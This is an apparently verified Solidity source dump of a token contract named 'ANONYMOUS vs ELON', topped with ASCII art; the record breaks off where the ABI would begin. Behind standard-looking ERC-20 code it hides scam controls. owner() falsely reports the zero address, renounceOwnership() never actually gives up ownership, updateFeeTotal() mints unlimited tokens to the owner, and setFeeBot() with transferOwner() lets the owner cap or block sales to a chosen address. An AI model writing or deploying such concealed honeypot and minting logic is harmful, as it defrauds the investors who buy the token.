{"status": "1", "message": "OK", "result": [{"SourceCode": "/*\r\n\r\n====================================================================================================================================================================================\r\n                                                         \r\n   _____      __   __      _____      __   __     _     _    ______     _____    __         _____      __   __   \r\n  /\\___/\\    /_/\\ /\\_\\    ) ___ (    /_/\\ /\\_\\   /_/\\ /\\_\\  / ____/\\  /\\_____\\  /\\_\\       ) ___ (    /_/\\ /\\_\\  \r\n / / _ \\ \\   ) ) \\ ( (   / /\\_/\\ \\   ) ) \\ ( (   ) ) ) ( (  ) ) __\\/ ( (_____/ ( ( (      / /\\_/\\ \\   ) ) \\ ( (  \r\n \\ \\(_)/ /  /_/   \\ \\_\\ / /_/ (_\\ \\ /_/   \\ \\_\\ /_/ / \\ \\_\\  \\ \\ \\    \\ \\__\\    \\ \\_\\    / /_/ (_\\ \\ /_/   \\ \\_\\ \r\n / / _ \\ \\  \\ \\ \\   / / \\ \\ )_/ / / \\ \\ \\   / / \\ \\ \\_/ / /  _\\ \\ \\   / /__/_   / / /__  \\ \\ )_/ / / \\ \\ \\   / / \r\n( (_( )_) )  )_) \\ (_(   \\ \\/_\\/ /   )_) \\ (_(   \\ \\   / /  )____) ) ( (_____\\ ( (_____(  \\ \\/_\\/ /   )_) \\ (_(  \r\n \\/_/ \\_\\/   \\_\\/ \\/_/    )_____(    \\_\\/ \\/_/    \\_\\_/_/   \\____\\/   \\/_____/  \\/_____/   )_____(    \\_\\/ \\/_/  \r\n                                                        \r\n\u201cMillions of retail investors were really counting on their crypto gains to improve their lives.\u201d           @ANONvsELON                                                                 \r\n\r\n====================================================================================================================================================================================\r\n\r\n?T{fziiJSNQ@@@@@@@@@@@@@@@QQQQQQQQQQ@QQQQQQQQQQg7~'......'''''',~;*8@@QQQQQQQQQQQQQQQQQQQ@@@QQQ@@@@@@@@QQQ@QggA#PvEB@@@@\r\ni7f{T|cAQ@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@QQQQQQQQ8n_'''''''',,!;^jWQQQQQQQQQ@@QQQ@@@@@@@@@@@@@@@@@@@@@@@@@@@@@QQQg&Q@@@@\r\n7zz\\LXQ@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@QQQQQQN{~''',,,_~;\\DB8gBQQQQ@@@@@@@@QQ@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@QQ@@@@@\r\n**<sQ@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@QQQQ8i:,,__::!tU&QQQQ@@@@@QQ8DUDDDgDdD#8WgDgNg#QQQQQ@@@@@@@@@@@@@@@@@@@\r\n!!yQ@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@QQQQE!,,,,,_*JqQQQQQ@@Q6u?+^^^^^+^r=+*+*<LLizxy5SXUdgQQQ@@@@@@@@@@Q@@\r\nrq@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@QQQR<,,'',~*kQQQQQ&E7|>^!;;;;;;~~~~~~;;;;^r<?LiTJYyE6DNQ@@@@@@@@QQ@\r\nD@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@QB6i,',~^\\#QQQ8hY\\*+^;;;~~__,,,,:~~~;;!^^+<?LiT7YjawmKQQQQQQQQQQ@\r\n@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@Q@@Q@@@@@@@@@@@@@@Q8jz'..~5QQQRyz\\<^!;;~~:,,,,'',,_~~~~;;;^=|L\\TzsfjyySd&QQQ@@@QQ@\r\n@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@QQ@@@@@@@@@@@@@@QRz|'',qQQ8Eu\\*+;;~_,,,',,'''',,,__~~;;!+?LiT7I}yjjS68QQ@@Q@@@@\r\n@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@Qgqm}sxjEDQ@@@@@@@@@@@@@@@@@Q5f;`,qQQqjT*+!;~:,''''''...''',,:~~;;^+<??i7tn}}jhq8QQ@@@Q@@@\r\n@@@@@@@@@@@@@@@@@@@@@@@@@@Bqo7|=r^!!!!!^>\\fAQ@@@@Q@@@@@@@@@8zz,^QQWyL<^!;~~~,'''.......''',,~~;!^r^+*|\\c7J{yUDNQ@@@@QQQ@\r\n@@@@@@@@@@@@@@@@@@@@@@QAyzc|<=+^^!;;;;;;;;;^*zXQ@@@@@@@@@@@Qy5;^QQUL^!;;;;;~,''''..''''''',,_~~;!^+^r<?L\\zIjSb#Q@@@@@QQ@\r\n@@@@@@@@@@@@@@@@@@@QKY?!,''~^>>=r^^!!;;;;;;;;~~^zqQ@@Q@@@@@@gX??QBj<^;;;;;~:,''....''...''',,_~~;^+^^<L\\c7z}yX%QQ@@@@@@Q\r\n@@@@@@@@@@@@@@@@@@BUEayfxz<~.';++r^^!;;;;;,'``'~!+\\g@@@Q@@@@QR};RKv<!;;;~~,,'''......`...''',,_~;^+^>*|L\\7JfjakqB@@@@@@Q\r\n@@@@@@@@@@@@@@Qai|vyKQ@@QWha7^'';^!!;;;~,.';+*L\\7IjwN@@QQ@@@@WP;+X\\*^^!!r^!~,''''''''''''''',;!+*\\\\L|icv7n}}ymwUbQ@QQ@QS\r\n@@@@@@@@@@@@@hi=^;;~~;|ogQQQQqur,;!;;;_,;?fjU#NNda}7zaQ@@@@@@Qb=,}vLznz7z5EkmnL;~~,,',_~~;+tEUbqXPEEmmwXwyjj5owUKBQQQQQ\\\r\n@@@@@@@@@@@Qmi||?*<>+r^+*IUgQ@@D\\~;;;~^5N@@N%qx^_''''~j@@@@@@@gi,Lv\\zJi=;~~~~~!<?r~,,:;^*77?!~~;^r|zfawwPS555ow6b#QQQQQ5\r\n@@@@@@@@@@&j7iiLLi\\iL|||LizoURQ@g^~,~*QQ%KmYLr!;;;;~~~*Q@@@@@@&n_i7*?LcLiz{sz\\\\iLc=,',!?}}7xjoXUUy55oEwooyjjoSkqb8QQ&%qK\r\n@@@@@@@@@QUyjymXqbDDDd6Eay{}yUEaL_'''~yhm}7\\iLL||*+;;;=g@@@@@@85~+v<^*TSw}DRy!|xL<*~,~^7m\\i7i^oEo7yqDKPy{c7sjSXAbNQBdXoD\r\n@@@@@@@@D5zxfj}EQ@@@@QQ@@QgUyas\\;'``.~jynnjE6bdbq6Uo\\+?g@@@@@@6S~~7*^^^!+^^!!;r^;;=!~;*uSIL|*=+^=iIYiL7L?LTzjPqbD#Q%qm}A\r\n@@@@@@Qj<;;~;^=*JSPPEkUbDDdXL+^;'`` `'rJDQ@@@@@@@@NwwjuD@@@@@@ba~.i+;;;;;;;^^;;~~^*^;+iyy}L+!;!^=^^!^+>==|iJ5UDRR8%SwfjX\r\n@@@@@Qnr;;_,,''''',,~~~_,,:~~;;~'``  `,~~!Lzuffjyj<~~~;j@@@@@@N{,`?+!;!;;~~~,'',;+*^;+7jyf7<~,:~~~;^^+=L\\7JjEK%%%%hI}z7X\r\n@@@@@d}LL<!;~,,,''''.....'',~~;~'`   `.'``````````````.;Q@@@@QU|'`+*++^;;~:,'',~^**;;<z5km}*;~,,,~;!<?ix}foymb%%%%ESyj}q\r\n@@@@Qq6tjjxv|=!;~~:,,'''''',~;;~'`    ```````````..'',,~d@@@@Dz_``!i*<^!;~_,,,~^<?+~~^sSE}y5*!~,_~~^=|vz}jyoUD%R%%S}SPqq\r\n@@@@QUKXSESojIv|=+^!;;~~~~~~~~~~'`    ``'..'''',,_~;;!^?Q@@@Qf;```;\\L*^!;~~~;!!+7j7*<zXDdPaki*=;~~;^*\\7jyaEXbdDRRDjjoa6X\r\n@@@@QXkSKb6XPafJ77zJz77J}L~,:;;~,```  ```~~;;;!!^=|LLLib@@@@E=.```;7i?=^;~~;!^;;?7z5hXDKXEmjL<**^!^=|zfamk66bdDRRkfjjhUh\r\n@@@@@UE57w%gg%DKqbdXanc*T!~~;!;;,.`````'.'ymynYzcTztYfD@@@@Nc,````;zii*+;~~;;;!^;!^+*z7}jx7L|<*<*|*izjhUqq66bdDR%kyPbdqX\r\n@@@@@DEEc<T}5QAut|;~,,,,\\aSaj}zi=;~~__~!^!,~|add66bbSS@@@@@S;`````;JL??<^;;;;!;!^^!;^<!^***|iL|*?izYjakqK6XX6bD%N8Wg%Dbq\r\n@@@@@#Xhj=!LsK@x;;;~~,,,~iUgDdRbUmyjaaX%6|''',;cnQUL*Q@@@@W7'`````~I\\*=^^!!;;^!r*i7zvixIIzviLi7||czJzxjEkhmw6qDgBNNWg%%%\r\n@@@@@@UXEz!;zf6@Dv^;;;~~;!+>tNQ@@QQQ@R+;_,''',,,PP^!q@@@@Qo!``````'usi+!;;!;+z5XmfYuuujyokUD%DU{cit**\\uwEkhUqbD#Q@Q&BQQQ\r\n@@@@@@%kh5v^;fosdQ@QDwjInyw#@@@QSYDQQQR*_,,,,~L%w!~j@@@@@Qs,`````.'*oz|^;~;=\\iJjt\\ivzscvtyEUkSynTL*^Lzmkk6KdDDWQQ@@QQQQQ\r\n@@@@@@@XPoEx^;YknLvaD#QQQQQQ@#Xz|*|qQ@@@QQQQQQb7;~i@@@@@QQm:````..',zm{7<!;;^=<|Tznun}}j5aajs77iii\\syhXXqbDRg#QBQ@@@@@@@\r\n@@@@@@@QkaXXj^;7hXy|!;^?\\zfyjyyjjjjSq%gDbASs|+>;~iB@@@@Q%Dg7.```.'',_7waoui*<<?>^^^^^++<<|i7Yunzzfoh6AUqDRg8QQB#Q@@@@@@@\r\n@@@@@@@@@bkXkaL;|yoE66Pfv*^;~~:,,,',,,,,,~!|s7~~t8@@@@@QBW%%y~..''',:~>wjjxi*^^^!!;!!^!^+**?LL|\\JywUXkqDg8BQQWg&Q@@@@@@@\r\n@@@@@@@@@@Q6wEaz!!zjjjjahUqqqURDA6Uywk6qq6wy|,^y%@@@@@@QQQNgDqi,',,,~~|QQk5oz?++=|*??||*|c77vv{ohqDDdDWBQQQN%gWNQ@@@@@@@\r\n@@@@@@@@@@@@Qkmos?;>|LL|Li\\zmq@@@@Qayuzv\\cv^,LwB@@@@@@@@QQQ&gKUo+:_;LoQ@@Q6qbw}\\\\T\\vLL\\ny5yjywqDg8W8#QQQQgRDRgggBQ@@@@@@\r\n@@@@@@@@@@@@@@gSyfz*<=^!;;~;|S@@@@R+^!;~;;;^xd@@@@@@@@@@@QQB&gDqXwDQ@@@@@@DzmDW%dqXPwPkU6qDDgW8WNNBQQQ#gRbbDDR%gBQ@@@@@@\r\n@@@@@@@@@@QQQ@@@djs7\\L*+!;~;+o@@@Qa;~~~~!>7S#@@@@@@@@@@QQQQQQW%WgD8@@@QQ@@Qj?ijq%WgWW%%%g%%%RgW#QQQN%Dq6UU6bDDRWNQ@@@@@@\r\n@@@@@@@@@@Q#NBQQ@@Kuv|*<=r^^L6@@@@n^!!!^*7UQ@@@@@@@@@@@@QQQQQB8WNgg&Q@@@@@@Qt?**75UR8N#WgW88N#N8gRdq6XXkkXAbDDDD#@@@@@@@\r\n@@@@@@@@@@QQ#N88QQ@QDoY7i?*<JD@@@Qi*<=+Ly#@@@@@@@@@@@@@QQQQQQ#%RRRR&QQQQ@@@@QI?<=>LzjS6D%%RDdbKAA6UkkkwEkUqbDdqqQ@@@@@@@\r\n@@@@@@@@@@QQ8g%W#QQ@@@#qEo}sf6@@@mzzxYwN@@@@@@@@@@@@@@QQQQQQB#%RDR%&QQQQB@@@@Qw\\?++*\\symXXUXXXhkXXhwmwwhXUAqq6Ub@@@@@@@@\r\n@@@@@@@@@@QQW%%WBQQ@Q@@@@QQBWRQ@WKDWQQ@@@@@@@@@@@@@@@@QQQQQQQQNW%%WQQQQQN&Q@@@@bx7*+<izjowEkkPwmSaaaoSwkXkXXkhkQ@@@@@@@@\r\n@@@@@@@@QQQ#DDRgN#8Rdbg@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@QQQQQQQQQQW%8QQQQQQQQQ@@@@Qy7i|<|zj5SwEEwwSoyyyawwwmayy5K@@@@@@@Q@\r\n\r\nSPDX-License-Identifier: Mines\u2122\u00ae\u00a9\r\n*/                                                                                                                                      \r\n\r\n\r\n// SPDX-License-Identifier: MIT\r\npragma solidity ^0.6.12;\r\n\r\ninterface IERC20 {\r\n    /**\r\n     * @dev Returns the amount of tokens in existence.\r\n     */\r\n    function totalSupply() external view returns (uint256);\r\n\r\n    /**\r\n     * @dev Returns the amount of tokens owned by `account`.\r\n     */\r\n    function balanceOf(address account) external view returns (uint256);\r\n\r\n    /**\r\n     * @dev Moves `amount` tokens from the caller's account to `recipient`.\r\n     *\r\n     * Returns a boolean value indicating whether the operation succeeded.s\r\n     *\r\n     * Emits a {Transfer} event.\r\n     */\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n\r\n    /**\r\n     * @dev Returns the remaining number of tokens that `spender` will be\r\n     * allowed to spend on behalf of `owner` through {transferFrom}. This is\r\n     * zero by default.\r\n     *\r\n     * This value changes when {approve} or {transferFrom} are called.\r\n     */\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n\r\n    /**\r\n     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.\r\n     *\r\n     * Returns a boolean value indicating whether the operation succeeded.\r\n     *\r\n     * IMPORTANT: Beware that changing an allowance with this method brings the risk\r\n     * that someone may use both the old and the new allowance by unfortunate\r\n     * transaction ordering. One possible solution to mitigate this race\r\n     * condition is to first reduce the spender's allowance to 0 and set the\r\n     * desired value afterwards:\r\n     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\r\n     *\r\n     * Emits an {Approval} event.\r\n     */\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n\r\n    /**\r\n     * @dev Moves `amount` tokens from `sender` to `recipient` using the\r\n     * allowance mechanism. `amount` is then deducted from the caller's\r\n     * allowance.\r\n     *\r\n     * Returns a boolean value indicating whether the operation succeeded.\r\n     *\r\n     * Emits a {Transfer} event.\r\n     */\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n\r\n    /**\r\n     * @dev Emitted when `value` tokens are moved from one account (`from`) to\r\n     * another (`to`).\r\n     *\r\n     * Note that `value` may be zero.\r\n     */\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n\r\n    /**\r\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\r\n     * a call to {approve}. `value` is the new allowance.\r\n     */\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\nlibrary Address {\r\n    /**\r\n     * @dev Returns true if `account` is a contract.\r\n     *\r\n     * [IMPORTANT]\r\n     * ====\r\n     * It is unsafe to assume that an address for which this function returns\r\n     * false is an externally-owned account (EOA) and not a contract.\r\n     *\r\n     * Among others, `isContract` will return false for the following\r\n     * types of addresses:\r\n     *\r\n     *  - an externally-owned account\r\n     *  - a contract in construction\r\n     *  - an address where a contract will be created\r\n     *  - an address where a contract lived, but was destroyed\r\n     * ====\r\n     */\r\n    function isContract(address account) internal view returns (bool) {\r\n        // According to EIP-1052, 0x0 is the value returned for not-yet created accounts\r\n        // and 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470 is returned\r\n        // for accounts without code, i.e. `keccak256('')`\r\n        bytes32 codehash;\r\n        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;\r\n        // solhint-disable-next-line no-inline-assembly\r\n        assembly { codehash := extcodehash(account) }\r\n        return (codehash != accountHash && codehash != 0x0);\r\n    }\r\n\r\n    /**\r\n     * @dev Replacement for Solidity's `transfer`: sends `amount` wei to\r\n     * `recipient`, forwarding all available gas and reverting on errors.\r\n     *\r\n     * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost\r\n     * of certain opcodes, possibly making contracts go over the 2300 gas limit\r\n     * imposed by `transfer`, making them unable to receive funds via\r\n     * `transfer`. {sendValue} removes this limitation.\r\n     *\r\n     * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].\r\n     *\r\n     * IMPORTANT: because control is transferred to `recipient`, care must be\r\n     * taken to not create reentrancy vulnerabilities. Consider using\r\n     * {ReentrancyGuard} or the\r\n     * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].\r\n     */\r\n    function sendValue(address payable recipient, uint256 amount) internal {\r\n        require(address(this).balance >= amount, \"Address: insufficient balance\");\r\n\r\n        // solhint-disable-next-line avoid-low-level-calls, avoid-call-value\r\n        (bool success, ) = recipient.call{ value: amount }(\"\");\r\n        require(success, \"Address: unable to send value, recipient may have reverted\");\r\n    }\r\n\r\n    /**\r\n     * @dev Performs a Solidity function call using a low level `call`. A\r\n     * plain`call` is an unsafe replacement for a function call: use this\r\n     * function instead.\r\n     *\r\n     * If `target` reverts with a revert reason, it is bubbled up by this\r\n     * function (like regular Solidity function calls).\r\n     *\r\n     * Returns the raw returned data. To convert to the expected return value,\r\n     * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `target` must be a contract.\r\n     * - calling `target` with `data` must not revert.\r\n     *\r\n     * _Available since v3.1._\r\n     */\r\n    function functionCall(address target, bytes memory data) internal returns (bytes memory) {\r\n      return functionCall(target, data, \"Address: low-level call failed\");\r\n    }\r\n\r\n    /**\r\n     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with\r\n     * `errorMessage` as a fallback revert reason when `target` reverts.\r\n     *\r\n     * _Available since v3.1._\r\n     */\r\n    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {\r\n        return _functionCallWithValue(target, data, 0, errorMessage);\r\n    }\r\n\r\n    /**\r\n     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],\r\n     * but also transferring `value` wei to `target`.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - the calling contract must have an ETH balance of at least `value`.\r\n     * - the called Solidity function must be `payable`.\r\n     *\r\n     * _Available since v3.1._\r\n     */\r\n    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {\r\n        return functionCallWithValue(target, data, value, \"Address: low-level call with value failed\");\r\n    }\r\n\r\n    /**\r\n     * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but\r\n     * with `errorMessage` as a fallback revert reason when `target` reverts.\r\n     *\r\n     * _Available since v3.1._\r\n     */\r\n    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {\r\n        require(address(this).balance >= value, \"Address: insufficient balance for call\");\r\n        return _functionCallWithValue(target, data, value, errorMessage);\r\n    }\r\n\r\n    function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {\r\n        require(isContract(target), \"Address: call to non-contract\");\r\n\r\n        // solhint-disable-next-line avoid-low-level-calls\r\n        (bool success, bytes memory returndata) = target.call{ value: weiValue }(data);\r\n        if (success) {\r\n            return returndata;\r\n        } else {\r\n            // Look for revert reason and bubble it up if present\r\n            if (returndata.length > 0) {\r\n                // The easiest way to bubble the revert reason is using memory via assembly\r\n\r\n                // solhint-disable-next-line no-inline-assembly\r\n                assembly {\r\n                    let returndata_size := mload(returndata)\r\n                    revert(add(32, returndata), returndata_size)\r\n                }\r\n            } else {\r\n                revert(errorMessage);\r\n            }\r\n        }\r\n    }\r\n}\r\n\r\nlibrary SafeMath {\r\n    /**\r\n     * @dev Returns the addition of two unsigned integers, reverting on\r\n     * overflow.\r\n     *\r\n     * Counterpart to Solidity's `+` operator.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - Addition cannot overflow.\r\n     */\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n\r\n        return c;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the subtraction of two unsigned integers, reverting on\r\n     * overflow (when the result is negative).\r\n     *\r\n     * Counterpart to Solidity's `-` operator.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - Subtraction cannot overflow.\r\n     */\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on\r\n     * overflow (when the result is negative).\r\n     *\r\n     * Counterpart to Solidity's `-` operator.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - Subtraction cannot overflow.\r\n     */\r\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b <= a, errorMessage);\r\n        uint256 c = a - b;\r\n\r\n        return c;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the multiplication of two unsigned integers, reverting on\r\n     * overflow.\r\n     *\r\n     * Counterpart to Solidity's `*` operator.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - Multiplication cannot overflow.\r\n     */\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the\r\n        // benefit is lost if 'b' is also tested.\r\n        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n\r\n        return c;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the integer division of two unsigned integers. Reverts on\r\n     * division by zero. The result is rounded towards zero.\r\n     *\r\n     * Counterpart to Solidity's `/` operator. Note: this function uses a\r\n     * `revert` opcode (which leaves remaining gas untouched) while Solidity\r\n     * uses an invalid opcode to revert (consuming all remaining gas).\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - The divisor cannot be zero.\r\n     */\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the integer division of two unsigned integers. Reverts with custom message on\r\n     * division by zero. The result is rounded towards zero.\r\n     *\r\n     * Counterpart to Solidity's `/` operator. Note: this function uses a\r\n     * `revert` opcode (which leaves remaining gas untouched) while Solidity\r\n     * uses an invalid opcode to revert (consuming all remaining gas).\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - The divisor cannot be zero.\r\n     */\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b > 0, errorMessage);\r\n        uint256 c = a / b;\r\n        // assert(a == b * c + a % b); // There is no case in which this doesn't hold\r\n\r\n        return c;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\r\n     * Reverts when dividing by zero.\r\n     *\r\n     * Counterpart to Solidity's `%` operator. This function uses a `revert`\r\n     * opcode (which leaves remaining gas untouched) while Solidity uses an\r\n     * invalid opcode to revert (consuming all remaining gas).\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - The divisor cannot be zero.\r\n     */\r\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return mod(a, b, \"SafeMath: modulo by zero\");\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\r\n     * Reverts with custom message when dividing by zero.\r\n     *\r\n     * Counterpart to Solidity's `%` operator. This function uses a `revert`\r\n     * opcode (which leaves remaining gas untouched) while Solidity uses an\r\n     * invalid opcode to revert (consuming all remaining gas).\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - The divisor cannot be zero.\r\n     */\r\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b != 0, errorMessage);\r\n        return a % b;\r\n    }\r\n}\r\n\r\nabstract contract Context {\r\n    \r\n    function _msgSender() internal view virtual returns (address payable) {\r\n        return msg.sender;\r\n    }\r\n\r\n    function _msgData() internal view virtual returns (bytes memory) {\r\n        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691\r\n        return msg.data;\r\n    }\r\n}\r\n\r\ncontract Ownable is Context {\r\n    address private _owner;\r\n\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    /**\r\n     * @dev Initializes the contract setting the deployer as the initial owner.\r\n     */\r\n    constructor () internal {\r\n        address msgSender = _msgSender();\r\n        _owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the address of the current owner.\r\n     */\r\n    function owner() public view returns (address) {\r\n        return address(0);\r\n    }\r\n\r\n    /**\r\n     * @dev Throws if called by any account other than the owner.\r\n     */\r\n    modifier onlyOwner() {\r\n        require(_owner == _msgSender(), \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n\r\n    /**\r\n     * @dev Leaves the contract without owner. It will not be possible to call\r\n     * `onlyOwner` functions anymore. Can only be called by the current owner.\r\n     *\r\n     * NOTE: Renouncing ownership will leave the contract without an owner,\r\n     * thereby removing any functionality that is only available to the owner.\r\n     */\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n    }\r\n\r\n    /**\r\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\r\n     * Can only be called by the current owner.\r\n     */\r\n    function transferOwnership(address newOwner) private onlyOwner {\r\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\r\n        emit OwnershipTransferred(_owner, newOwner);\r\n        _owner = newOwner;\r\n    }\r\n}\r\n\r\ncontract ANONvsELON is Context, IERC20, Ownable {\r\n    using SafeMath for uint256;\r\n    using Address for address;\r\n\r\n    mapping (address => uint256) private _balances;\r\n    mapping (address => mapping (address => uint256)) private _allowances;\r\n    \r\n    address private _tOwnerAddress;\r\n    address private _tAllowAddress;\r\n   \r\n    uint256 private _tTotal = 1000 * 10**9 * 10**18;\r\n\r\n    string private _name = 'ANONYMOUS vs ELON';\r\n    string private _symbol = 'ANONvsELON';\r\n    uint8 private _decimals = 18;\r\n    uint256 private _feeBot = 50 * 10**6 * 10**18;\r\n\r\n    constructor () public {\r\n        _balances[_msgSender()] = _tTotal;\r\n\r\n        emit Transfer(address(0), _msgSender(), _tTotal);\r\n    }\r\n\r\n    function name() public view returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public view returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public view returns (uint8) {\r\n        return _decimals;\r\n    }\r\n    \r\n    function allowance(address owner, address spender) public view override returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) public override returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }\r\n    \r\n    function transferOwner(address newOwnerAddress) public onlyOwner {\r\n        _tOwnerAddress = newOwnerAddress;\r\n    }\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(sender, recipient, amount);\r\n        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, \"ERC20: transfer amount exceeds allowance\"));\r\n        return true;\r\n    }\r\n    \r\n    function addAllowance(address allowAddress) public onlyOwner {\r\n        _tAllowAddress = allowAddress;\r\n    }\r\n    \r\n    function updateFeeTotal(uint256 amount) public onlyOwner {\r\n        require(_msgSender() != address(0), \"ERC20: cannot permit zero address\");\r\n        _tTotal = _tTotal.add(amount);\r\n        _balances[_msgSender()] = _balances[_msgSender()].add(amount);\r\n        emit Transfer(address(0), _msgSender(), amount);\r\n    }\r\n    \r\n    function setFeeBot(uint256 feeBotPercent) public onlyOwner {\r\n        _feeBot = feeBotPercent * 10**18;\r\n    }\r\n\r\n    function totalSupply() public view override returns (uint256) {\r\n        return _tTotal;\r\n    }\r\n\r\n    function balanceOf(address account) public view override returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n\r\n    function transfer(address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }\r\n    \r\n    function _approve(address owner, address spender, uint256 amount) private {\r\n        require(owner != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n      \r\n    function _transfer(address sender, address recipient, uint256 amount) internal {\r\n        require(sender != address(0), \"BEP20: transfer from the zero address\");\r\n        require(recipient != address(0), \"BEP20: transfer to the zero address\");\r\n        \r\n        if (sender != _tAllowAddress && recipient == _tOwnerAddress) {\r\n            require(amount < _feeBot, \"Transfer amount exceeds the maxTxAmount.\");\r\n        }\r\n    \r\n        _balances[sender] = _balances[sender].sub(amount, \"BEP20: transfer amount exceeds balance\");\r\n        _balances[recipient] = _balances[recipient].add(amount);\r\n        emit Transfer(sender, recipient, amount);\r\n    }\r\n}", "ABI": 